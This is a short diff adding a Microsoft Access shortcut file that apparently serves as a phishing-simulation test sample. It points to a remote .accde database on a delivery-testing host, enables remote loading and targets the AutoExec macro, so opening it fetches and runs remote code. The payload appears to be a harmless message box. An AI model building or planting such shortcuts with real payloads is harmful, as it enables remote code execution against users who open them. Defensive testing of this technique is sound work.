@@ -1,0 +1,10 @@
+[Shortcut Properties]
+AccessShortcutVersion=1
+DatabaseName=test_msgbox_accde.accde
+ObjectName=AutoExec
+ObjectType=Macro
+Computer=LAPTOP
+DatabasePath=https://files.delivrto.me/test_msgbox_accde.accde
+EnableRemote=1
+CreationTime=1d40736e4587e24
+Icon=265
